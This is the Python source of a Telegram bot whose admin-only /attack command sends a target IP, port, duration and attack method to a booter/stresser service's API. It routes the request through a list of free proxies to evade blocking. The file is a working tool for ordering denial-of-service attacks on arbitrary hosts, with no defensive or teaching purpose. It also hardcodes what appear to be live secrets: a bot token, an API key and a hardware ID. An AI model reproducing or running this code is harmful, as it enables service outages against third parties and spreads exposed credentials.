import asyncio
import requests
import random
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# --- CONFIG ---
API_TOKEN = '8698418003:AAF2mTYGzF6eRhJ7iQRD2wwXeEwXF_P4wh8'
API_KEY = "f2fb37dd1800da5e267b4e045a97ed25be0ae91c912d4d7a77912ae921c5a481" 
ADMIN_ID = 1001450667
MY_HWID = "1fde54bc203b764c212172bb8157015e290cee6510c23be30b96020cc94afb5"

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("attack"))
async def cmd_attack(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 5: return await message.answer("⚠️ `/attack IP PORT TIME METHOD`")
    
    target, port, duration, method = args[1], args[2], args[3], args[4]
    sent = await message.answer("🛰️ **ROUTING THROUGH INDIAN PROXY...**")

    # --- VIP HEADERS ---
    headers = {
        "X-API-Key": API_KEY,
        "X-HWID": MY_HWID,
        "User-Agent": "AN-HAX-VIP-CLIENT",
        "Content-Type": "application/json"
    }

    # API Endpoints to try
    url = f"https://retrostress.net/api/v1/tests?key={API_KEY}"
    payload = {"host": target, "port": int(port), "time": int(duration), "method": method.upper(), "vip": True}

    # PROXY LIST (Indian/Residential)
    # Bhai, free proxies thode slow hote hain but Cloud IP block bypass kar dete hain
    proxies = [
        "http://43.251.106.182:80",
        "http://103.119.144.137:80",
        "http://103.174.102.138:80"
    ]

    success = False
    for proxy in proxies:
        try:
            proxy_dict = {"http": proxy, "https": proxy}
            res = requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
            
            if res.status_code == 200:
                success = True
                break
        except:
            continue

    if success:
        await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `PROXY BYPASS SUCCESS` 🔥")
    else:
        # Final Fallback: Direct hit without proxy (just in case)
        try:
            res = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
            if res.status_code == 200:
                return await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `DIRECT HIT` 🔥")
        except: pass
        
        await sent.edit_text("❌ **ALL GATEWAYS BLOCKED:** Bhai, unka server ab kisi bhi cloud ya proxy ko accept nahi kar raha. Termux hi king hai!")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
